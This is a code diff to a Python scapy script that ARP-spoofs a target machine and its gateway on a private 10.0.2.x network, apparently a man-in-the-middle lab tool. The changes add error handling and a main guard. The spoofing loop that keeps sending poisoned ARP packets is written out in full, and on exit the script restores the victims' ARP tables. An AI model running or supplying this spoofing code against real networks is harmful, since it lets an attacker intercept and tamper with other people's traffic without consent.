@@ -9,15 +9,18 @@ import sys
 
 def get_mac_address(ip):
     if not ip:
-        print("No input given. Existing program")
+        print("No input given. Exiting program")
         exit()
 
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast/arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-    return answered_list[0][1].hwsrc
+        return answered_list[0][1].hwsrc
+    except IndexError:
+        print("[-] Index out of bound exception found")
 
 
 def restore(source_ip, destination_ip):
@@ -32,19 +35,21 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-target_ip = "10.0.2.21"
-gateway_ip = "10.0.2.1"
-packet_counter = 0
-try:
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        packet_counter = packet_counter + 2
-        print("\r[+] Number of packets sent are " + str(packet_counter), end="")
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\n[+] Exiting program and restoring IP")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
-    print("[+] Restoring done!")
+if __name__ == "__main__":
+
+    target_ip = "10.0.2.21"
+    gateway_ip = "10.0.2.1"
+    packet_counter = 0
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            packet_counter = packet_counter + 2
+            print("\r[+] Number of packets sent are " + str(packet_counter), end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[-] Exiting program and restoring IP")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+        print("[-] Restoring done!")
 
